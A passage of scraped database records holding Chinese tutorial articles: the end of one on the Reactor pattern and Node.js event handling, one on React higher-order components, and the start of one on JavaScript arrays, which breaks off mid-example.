服务员将菜单给后厨。\u003c/p\u003e\n\u003cp\u003e十个人来就餐，十个服务员去服务……\u003c/p\u003e\n\u003cp\u003e这个就是\u003cstrong\u003e多线程\u003c/strong\u003e的处理方式，一个请求到来，就会有一个线程服务。很显然这种方式在人少的情况下会有很好的用户体验，每个客人都感觉自己是VIP，专人服务的。如果餐厅一直这样同一时间最多来10个客人，这家餐厅是可以很好的服务下去的。\u003c/p\u003e\n\u003cp\u003e那么问题来了，如果这家餐厅生意非常好，同时就餐人数(网站并发访问量)达到100人呢，给每个分配个服务员那餐馆怕不是要破产。\u003c/p\u003e\n\u003cp\u003e尽管可以考虑使用类似\u003cstrong\u003e线程池\u003c/strong\u003e的方法，组成一个10个服务员的线程池，一个服务员服务完一个人后继续去服务下一个。\n但是这样有一个比较严重的缺点就是，如果某个客人点菜很慢(\u003cstrong\u003e读写文件，网路请求等操作和内存读写比起来非常的慢\u003c/strong\u003e)，其他人可能就要等好长时间了。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e事件驱动的解决方案\u003c/h3\u003e\n\u003cp\u003e其实当客人在点菜的时候，大部服务员服务的时候都在等着客人的菜上好后才去服务下一个(\u003cstrong\u003e阻塞\u003c/strong\u003e)，其实干的活不是太多。如果客人需要点餐的时候直接告诉服务员，我需要宫保鸡丁，做好之后直接放到14桌，然后服务员就可以去服务下一个人了，这样是不是能够有效利用服务员的资源？\u003c/p\u003e\n\u003cp\u003e其实这就是基于事件的解决方案，“\u003cstrong\u003e做好之后放到14桌\u003c/strong\u003e”其实就是回调函数。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e反应器模式\u003c/h3\u003e\n\u003cp\u003e先直接贴一下Douglas C. Schmidt 大佬的论文 \u003ca target=\"_blank\" href=\"http://www.dre.vanderbilt.edu/~schmidt/PDF/reactor-siemens.pdf\"\u003eAn Object Behavioral Pattern for Demultiplexing and Dispatching Handles for Synchronous Events.pdf \u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eNode.js中的反应器模式(Reactor pattern)\u003c/h2\u003e\n\u003cp\u003eNode.js 这几年非常火，借助 js 天生的事件驱动机制和 V8高性能引擎，让编写高并发的web应用门槛降低了许多，当然这背后还要得益于\u003cstrong\u003e基于事件驱动的 Reactor 模式\u003c/strong\u003e，让本身只支持单线程执行的 js 能够胜任如今高并发环境下的服务端应用。\u003c/p\u003e\n\u003cp\u003e下面这张图就是一个应用里面使用Reactor模式的图示\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b6cfed1e4c9c2?w=687\u0026amp;h=481\u0026amp;f=png\u0026amp;s=75201\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n当应用使用Reactor模式的时候发生了如下过程：\u003cp\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e应用通过向\u003cstrong\u003eEvent Demultiplexer\u003c/strong\u003e提交一个请求生成一个新的I/O操作。应用同时指定一个\u003cstrong\u003ehandler\u003c/strong\u003e，这个handler会在操作完成时被调用，其实就是回调函数或者叫事件处理函数。向\u003cstrong\u003eEvent Demultiplexer\u003c/strong\u003e提交一个请求是\u003cstrong\u003e非阻塞\u003c/strong\u003e(non-blocking)的调用，会立即返回。\u003c/li\u003e\n\u003cli\u003e当一系列I/O操作完成后，\u003cstrong\u003eEvent Demultiplexer\u003c/strong\u003e会把对应触发的event的项推进\u003cstrong\u003eEvent Queue\u003c/strong\u003e。\u003c/li\u003e\n\u003cli\u003e与此同时，\u003cstrong\u003eEvent Loop\u003c/strong\u003e会遍历所有\u003cstrong\u003eEvent Queue\u003c/strong\u003e里面的每一项。\u003c/li\u003e\n\u003cli\u003e对于每个事件event，相应的处理程序handler会被执行。\u003c/li\u003e\n\u003cli\u003e当处理程序handler执行完后会把控制流交还给\u003cstrong\u003eEvent Loop\u003c/strong\u003e(5a)，然而有可能处理程序中会产生新的异步操作(5b)，导致在控制流回到\u003cstrong\u003eEvent Loop\u003c/strong\u003e之前会向\u003cstrong\u003eEvent Demultiplexer\u003c/strong\u003e中插入新的项。\u003c/li\u003e\n\u003cli\u003e当\u003cstrong\u003eEvent Queue\u003c/strong\u003e中的所有项都执行完后，这个循环会在\u003cstrong\u003eEvent Demultiplexer\u003c/strong\u003e中被关闭，当再次有新事件被加入Event Queue时再触发另一个循环。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e前端的同学对于\u003cstrong\u003eEvent Loop\u003c/strong\u003e应该比较熟吧。\u003c/p\u003e\n\u003cp\u003e现在再来重新看一下定义是不是清晰了一点？\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e反应器设计模式(Reactor pattern)是一种为处理服务请求并发 提交到一个或者多个服务处理程序的事件设计模式。当请求抵达后，服务处理程序使用解多路分配策略，然后同步地派发这些请求至相关的请求处理程序。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e随便扯扯\u003c/h4\u003e\n\u003cp\u003e其实\u003cstrong\u003eEvent Demultiplexer\u003c/strong\u003e之前我就有过一些了解不过没有深入，当时是在做计算机网络大作业的时候，当时选题是做一个\u003cstrong\u003eWeb Server\u003c/strong\u003e，类似Apache、Nginx那种。当时研究高并发模型的时候接触到了\u003cstrong\u003eI/O多路复用\u003c/strong\u003e(multiplexing)，其实就是事件驱动，当时用的libevent的库，好像是基于的linux的epoll系统调用实现的。\u003c/p\u003e\n","buildTime":"1515067411.612","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c79"},"id":"59818a485188255694568ff2","author":{"$oid":"5a4e188de4919b0e782b4c70"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"带着三个问题深入浅出React高阶组件","meta":{"likeCount":0},"tag":["React.js","JavaScript"],"comment":[],"shortContent":"\"高阶\"二字听起来非常唬人，因为大学高数课上的高阶方程让人抓狂，从而让第一次接触\"高阶组件\"概念的人们误以为又是什么高深的思想和复杂的逻辑。但相信在你学习完成后和生产环境大量使用过程中，就会发现这个所谓\"高阶组件\"真的一点也不高阶，非常简单易懂。本文通过回答三个问题带你深入浅出…","content":"\u003cp\u003e\"高阶\"二字听起来非常唬人，因为大学高数课上的高阶方程让人抓狂，从而让第一次接触\"高阶组件\"概念的人们误以为又是什么高深的思想和复杂的逻辑。但相信在你学习完成后和生产环境大量使用过程中，就会发现这个所谓\"高阶组件\"真的一点也不高阶，非常简单易懂。本文通过回答三个问题带你深入浅出React高阶组件。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e1.为什么需要高阶组件？\u003c/h4\u003e\u003ch4 class=\"heading\"\u003e2.高阶组件是什么？\u003c/h4\u003e\u003ch4 class=\"heading\"\u003e3.如何实现高阶组件？\u003c/h4\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1.为什么需要高阶组件？\u003c/h3\u003e\u003cp\u003e这个问题很简单，为什么我们需要react/vue/angular？使用框架最核心的原因之一就是提高开发效率，能早点下班。同理，react高阶组件能够让我们写出更易于维护的react代码，能再早点下班~\u003c/p\u003e\n\u003cp\u003e举个栗子，ES6支持使用import/export的方式拆分代码功能和模块，避免一份文件里面出现\"成坨\"的代码。同理对于复杂的react组件，如果这个组件有几十个自定义的功能函数，自然要进行拆分，不然又成了\"一坨\"组件，那么该如何优雅地拆分组件呢？react高阶组件应运而生。\u003c/p\u003e\n\u003cp\u003e在使用ES5编写react代码时，可以使用Mixin这一传统模式进行拆分。新版本的react全面支持ES6并提倡使用ES6编写jsx，同时取消了Mixin。因此高阶组件越来越受到开源社区的重视，例如redux等知名第三方库都大量使用了高阶组件。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2.高阶组件是什么？\u003c/h3\u003e\u003cp\u003e回答这个问题前，我们先看下本文的封面图，为什么笔者用初中生就掌握的一元一次函数来代表这篇文章呢？很显然，高阶函数就是形如\u003ccode\u003ey=kx+b\u003c/code\u003e的东西，\u003ccode\u003ex\u003c/code\u003e是我们想要改造的原组件，\u003ccode\u003ey\u003c/code\u003e就是改造过后输出的组件。那具体是怎么改造的呢？\u003ccode\u003ek\u003c/code\u003e和\u003ccode\u003eb\u003c/code\u003e就是改造的方法。这就是高阶组件的基本原理，是不是一点也不高阶~\u003c/p\u003e\n\u003cp\u003e再举个栗子相信更能让你明白：我们写代码需要进行加法计算，于是我们把加法计算的方法单独抽出来写成一个加法函数，这个加法函数可以在各处调用使用，从而减少了工作量和代码量。而我们独立出来的这个可以随处使用的加法函数，类比地放在react里，就是高阶组件。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3.如何实现高阶组件？\u003c/h3\u003e\u003cp\u003e从上面的问题回答中，我们知道了：高阶组件其实就是处理react组件的函数。那么我们如何实现一个高阶组件？有两种方法：\u003c/p\u003e\n\u003cp\u003e1.属性代理\u003cbr\u003e2.反向继承\u003c/p\u003e\n\u003cp\u003e第一种方法属性代理是最常见的实现方式，将被处理组件的\u003ccode\u003eprops\u003c/code\u003e和新的\u003ccode\u003eprops\u003c/code\u003e一起传递给新组件，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//WrappedComponent为被处理组件\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e HOC(WrappedComponent){\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e class HOC extends Component {\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n            const newProps = {\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'HOC'\u003c/span\u003e};\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div\u0026gt;\n                \u0026lt;WrappedComponent {...this.props} {...newProps}/\u0026gt;\n            \u0026lt;/div\u0026gt;\n        }\n    }\n}\n\n@HOC\nclass OriginComponent extends Component {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;div\u0026gt;这是原始组件\u0026lt;/div\u0026gt;\n    }\n}\n\n//const newComponent = HOC(OriginComponent)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e属性代理听起来好像很麻烦，然而从代码中看，就是使用HOC这个函数，向被处理的组件WrappedComponent上面添加一些属性，并返回一个包含原组件的新组件。从chrome调试台上我们可以看到原始组件已经被包裹起来了并具有\u003ccode\u003etype\u003c/code\u003e属性：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/16/9c51190ea8933bb938d911f22a3f0b6f\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e上述代码使用了ES7的decorator装饰器来实现对\u003ccode\u003eOriginComponent\u003c/code\u003e组件的装饰和增强，或者使用注释中的函数方法一样可以达到相同的效果。\u003c/p\u003e\n\u003cp\u003e使用属性代理的好处就是，可以把常用的方法独立出来并多次复用。比如我们实现了一个加法函数，那么我们把加法函数改造成形如上述\u003ccode\u003eHOC\u003c/code\u003e函数的形式，之后对其他组件进行包裹，就可以在组件里使用这个方法了。\u003c/p\u003e\n\u003cp\u003e第二种方法反向继承就有意思了，先看代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e HOC(WrappedComponent){\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e class HOC extends WrappedComponent {\n        //继承了传入的组件\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003etest1\u003c/span\u003e\u003c/span\u003e(){\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.test2() + 5;\n        }\n\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecomponentDidMount\u003c/span\u003e\u003c/span\u003e(){\n            console.log(\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e);\n            this.setState({number:2});\n        }\n\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n            //使用super调用传入组件的render方法\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e super.render();\n        }\n    }\n}\n\n@HOC\nclass OriginComponent extends Component {\n    constructor(props){\n        super(props);\n        this.state = {number:1}\n    }\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003etest2\u003c/span\u003e\u003c/span\u003e(){\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 4;\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecomponentDidMount\u003c/span\u003e\u003c/span\u003e(){\n        console.log(\u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e);\n    }\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div\u0026gt;\n                {this.state.number}{\u003cspan class=\"hljs-string\"\u003e'and'\u003c/span\u003e}\n                {this.test1()}\n                这是原始组件\n            \u0026lt;/div\u0026gt;\n        )\n    }\n}\n\n//const newComponent = HOC(OriginComponent)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代码看完我们可能还有点懵，那我们先来剖析关键词\"继承\"。何谓继承？新生成的\u003ccode\u003eHOC\u003c/code\u003e组件通过\u003ccode\u003eextends\u003c/code\u003e关键字，获得了传入组件\u003ccode\u003eOriginComponent\u003c/code\u003e所有的属性和方法，是谓\"继承\"。也就是说继承之后，\u003ccode\u003eHOC\u003c/code\u003e组件能够实现\u003ccode\u003eOriginComponent\u003c/code\u003e组件的全部功能，而且，\u003ccode\u003eHOC\u003c/code\u003e可以拿到\u003ccode\u003estate\u003c/code\u003e和\u003ccode\u003eprops\u003c/code\u003e进行修改，从而改变组件的行为，也就是所谓的\"渲染劫持\"。可以说，通过反向继承方法实现的高阶组件相比于属性代理实现的高阶组件，功能更强大，个性化程度更高，适应更多的场景。\u003c/p\u003e\n\u003cp\u003e如上的代码，我们可以看到:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/16/bdd2f7c80f663781fc350fc1e697d755\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e第一：\u003ccode\u003ethis.test1()\u003c/code\u003e输出了9。为什么？\u003cbr\u003e因为在ES6中，\u003ccode\u003esuper\u003c/code\u003e作为对象调用父类方法时，\u003ccode\u003esuper\u003c/code\u003e绑定子类的\u003ccode\u003ethis\u003c/code\u003e。故执行\u003ccode\u003esuper.render()\u003c/code\u003e时\u003ccode\u003eOriginComponent\u003c/code\u003e中的\u003ccode\u003ethis\u003c/code\u003e指向的是\u003ccode\u003eHOC\u003c/code\u003e组件，所以能够成功地执行\u003ccode\u003etest1\u003c/code\u003e函数。\u003c/p\u003e\n\u003cp\u003e第二：控制台输出的是1而不是2。为什么？\u003cbr\u003e首先，decorator是在代码编译阶段执行，故\u003ccode\u003eHOC\u003c/code\u003e的\u003ccode\u003erender\u003c/code\u003e方法在\u003ccode\u003eOriginComponent\u003c/code\u003e的\u003ccode\u003erender\u003c/code\u003e方法之前执行。并且子组件\u003ccode\u003eHOC\u003c/code\u003e是继承于父组件\u003ccode\u003eOriginComponent\u003c/code\u003e，两者具有继承关系\u003ccode\u003eHOC.__proto__ === OriginComponent\u003c/code\u003e，当执行\u003ccode\u003ecomponentDidMount\u003c/code\u003e方法时，子组件已存在该方法，故执行完毕后结束，不再根据\u003ccode\u003e__proto__\u003c/code\u003e向上继续寻找。如果我们将子组件\u003ccode\u003eHOC\u003c/code\u003e中的\u003ccode\u003ecomponentDidMount\u003c/code\u003e方法去掉，那么控制台将输出2。\u003c/p\u003e\n\u003cp\u003e当我们有多个高阶组件需要同时增强一个组件时该怎么办呢？我们可以这样写：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e@fun1\n@fun2\n@fun3\nclass OriginComponent extends Component {\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e也可以使用\u003ccode\u003elodash\u003c/code\u003e的\u003ccode\u003eflowRight\u003c/code\u003e方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econst enchance = lodash.flowRight(fun1,fun2,fun3);\n\n@enchance\nclass OriginComponent extends Component {\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e因为\u003ccode\u003efun1\u003c/code\u003e \u003ccode\u003efun2\u003c/code\u003e \u003ccode\u003efun3\u003c/code\u003e都是处理类的函数，只要实现按顺序依次对类进行处理即可。\u003c/p\u003e\n\u003cp\u003e以上就是关于高阶组件实现方式的全部内容。为了查缺补漏，官方文档中有两条建议很中肯，在这里摘抄给大家：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/16/a266691d96468210550f08eb0437f939\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e一句话总结，为了避免在调试时，因为高阶组件的存在而导致满屏的\u003ccode\u003eHOC\u003c/code\u003e(以上述代码为例)，可以设置类的\u003ccode\u003edisplayName\u003c/code\u003e属性修改组件的名称。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/16/f1bde6e75b4b5af876afc7b93c975678\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如果你对ES6中的继承非常了解的话，那理解上述文字应该非常简单。ES6的继承中，子类不能继承父类的静态方法，即使用\u003ccode\u003estatic\u003c/code\u003e关键字定义的方法。如果子类想使用，那么一定要\u003ccode\u003ecopy\u003c/code\u003e之后才能使用。\u003c/p\u003e\n\u003cp\u003e总结一下，高阶组件其实就是处理组件的函数，他有两种实现方式：\u003cbr\u003e一是属性代理，类似于一元一次方程的\u003ccode\u003ey = x + b\u003c/code\u003e，输入\u003ccode\u003ex\u003c/code\u003e是原组件，参数\u003ccode\u003eb\u003c/code\u003e是你要添加或删除的属性/方法，\u003ccode\u003ey\u003c/code\u003e是最终输出的组件。\u003cbr\u003e二是反向继承，类似于一元一次方程的\u003ccode\u003ey = kx + b\u003c/code\u003e，可以拿到\u003ccode\u003estate\u003c/code\u003e和\u003ccode\u003eprops\u003c/code\u003e进行渲染劫持(\u003ccode\u003ek\u003c/code\u003e)，改变组件的行为。\u003c/p\u003e\n","buildTime":"1515033327.7136","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac90"},"id":"5a4db0ef5188257d692a00b4","author":{"$oid":"5a4e17dee8405d2778beac7a"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"把JavaScript标准库之数组一网打尽","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"1. 数组的简单概念 编程总要和数据打交道，常见的普通的数据由基本数据类型可以定义，一些具有多重属性、内容的数据就需要复杂的数据类型去定义，也就是对象来定义，数组也是对象的一种。 为了方便理解，我们可以认为数组是具有一定顺序的复杂数据的组合(与对象的无序区别)，每个位置对应一个…","content":"\u003cblockquote\u003e\n\u003cp\u003e学习任何编程语言，数组都是绕不过去的坎，每个编程语言都在其标准库里面内置了功能强大的Array对象。通过参考阮一峰教程和MDN,我把数组常见的方法以及一些误区总结如下，内容较多，而且会继续补充，希望这一篇文章可以把数组的知识一网打尽。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e1. 数组的简单概念\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e1.1 数组是什么呢？\u003c/h4\u003e\n\u003cp\u003e编程总要和数据打交道，常见的普通的数据由基本数据类型可以定义，一些具有多重属性、内容的数据就需要复杂的数据类型去定义，也就是对象来定义，数组也是对象的一种。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e为了方便理解，我们可以认为数组是具有一定顺序的复杂数据的组合(与对象的无序区别)，每个位置对应一个索引，索引从0开始，具有length属性，而且\u003cstrong\u003elength属性是可变的\u003c/strong\u003e。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e1.2 数组如何定义\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e第一种方法是通过Array构造函数来定义(该方法并不常用)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr1 = new Array(3)\nundefined\narr1\n(3) [empty × 3]\n    length: 3\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上是控制台打印结果，构造了一个长度为3的、每个元素为空的数组。\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e以上的写法有个小bug\n虽然元素为空，但是正常来说，索引应该存在的，但是事实是 索引竟然不存在\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003earr1[0]\nundefined\narr1[1]\nundefined\narr1[2]\nundefined\n0 \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e arr1\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n1 \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e arr1\n\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n2 \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e arr1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e索引0、1、2处是undefined，完全合理，但是索引不存在，很奇怪\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e而且new不写也是一样的结果。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr2 = Array(3)\nundefined\narr2\n(3) [empty × 3]\n    length: 3\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e但是采用构造函数的这种方法容易产生一些歧义，不同的参数个数，会产生不同的结果。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 class=\"heading\"\u003e1.2.1 构造函数不写参数\u003c/h5\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr3 = new Array\nundefined\narr3\n[]\n    length:0\n    __proto__:Array(0\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时构造出空的数组，而且发现构造函数的()写不写都可以\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e1.2.2 构造函数写1个正整数参数\u003c/h5\u003e\n\u003cp\u003e那这个正整数参数就是构造出来的数组的长度。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e1.2.3 构造函数参数是一个非正整数(字符串、boolean、对象等其他值)\u003c/h5\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = new Array(\u003cspan class=\"hljs-string\"\u003e'jjj'\u003c/span\u003e)\nundefined\narr\n[\u003cspan class=\"hljs-string\"\u003e\"jjj\"\u003c/span\u003e]\n    0: \u003cspan class=\"hljs-string\"\u003e\"jjj\"\u003c/span\u003e\n    length: 1\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = new Array(\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e)\nundefined\narr\n[\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e]\n    0: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    length: 1\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = new Array({0: \u003cspan class=\"hljs-string\"\u003e'我是一个对象'\u003c/span\u003e})\nundefined\narr\n[{…}]\n    0: {0: \u003cspan class=\"hljs-string\"\u003e\"我是一个对象\"\u003c/span\u003e}\n    length: 1\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个非正整数就是数组的内容\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e1.2.4 构造函数写多个参数\u003c/h5\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr4 = new Array(1, 2)\nundefined\narr4\n(2) [1, 2]\n    0: 1\n    1: 2\n    length: 2\n    __proto__: Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时直接构造出0索引是元素1、1索引是元素2的数组对象。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr4 = new Array(\u003cspan class=\"hljs-string\"\u003e'aa'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ff'\u003c/span\u003e, 10, 0)\nundefined\narr4\n(4) [\u003cspan class=\"hljs-string\"\u003e\"aa\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"ff\"\u003c/span\u003e, 10, 0]\n    0: \u003cspan class=\"hljs-string\"\u003e\"aa\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"ff\"\u003c/span\u003e\n    2: 10\n    3: 0\n    length: 4\n    __proto__:Array(0)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即多参数时，所有参数都是返回的新数组的成员\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e1.2.5 构造函数参数是非正整数，报错\u003c/h5\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enew Array(-1)\nVM376:1 Uncaught RangeError: Invalid array length\n    at \u0026lt;anonymous\u0026gt;:1:1\n(anonymous) @ VM376:1\nnew Array(3.2)\nVM377:1 Uncaught RangeError: Invalid array length\n    at \u0026lt;anonymous\u0026gt;:1:1\n(anonymous) @ VM377:1\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 class=\"heading\"\u003e1.2.6 数组定义的正确方法\u003c/h5\u003e\n\u003cp\u003e综上所述，其实实际中直接用字面量定义数组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = [\u003cspan class=\"hljs-string\"\u003e'这样子'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'定义'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'is'\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, 1, {\u003cspan class=\"hljs-string\"\u003e'good'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'我是数组索引为5的元素的值'\u003c/span\u003e}]\nundefined\narr\n(6) [\u003cspan class=\"hljs-string\"\u003e\"这样子\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"定义\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"is\"\u003c/span\u003e, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, 1, {…}]\n    0: \u003cspan class=\"hljs-string\"\u003e\"这样子\"\u003c/span\u003e\n    1: \u003cspan class=\"hljs-string\"\u003e\"定义\"\u003c/span\u003e\n    2: \u003cspan class=\"hljs-string\"\u003e\"is\"\u003c/span\u003e\n    3: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    4: 1\n    5: {good: \u003cspan class=\"hljs-string\"\u003e\"我是数组索引为5的元素的值\"\u003c/span\u003e}\n    length: 6\n    __proto__:Array(0)\n\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2. 数组的length属性解疑\u003c/h3\u003e\n\u003cp\u003e如果你是初学者，一定要记住数组的length属性和里面有几个元素无关，爱几个元素几个元素，length并不是计数的作用。这是我自学是对数组长度最大的误解。\n正确的理解是：\u003cstrong\u003e\u003ccode\u003e数组的length属性等于最大正整数索引+1\u003c/code\u003e\u003c/strong\u003e\n而，数组的索引可以随便改变，那么length属性也是一个动态的值，可以变化。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar arr = []\nundefined\narr\n[]\n    length:0\n    __proto__:Array(0)\narr[10] = \u003cspan class=\"hljs-string\"\u003e'我是第10个元素，我前面没有元素，但是数组的长度绝对是11，你信不信'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"我是第10个元素，我前面没有元素，但是数组的长度绝对是11，你信不信\"\u003c/span\u003e\narr\n(11) [empty × 10, \u003cspan class=\"hljs-string\"\u003e\"我是第10个元素，我前面没有元素，但是数组的长度绝对是11，你信不信\"\u003c/span\u003e]\n    10:\u003cspan class=\"hljs-string\"\u003e\"我是第10个元素，我前面没有元素，但是数组的长度绝对是11，你信不信\"\u003c/span\u003e\n    length:11\n    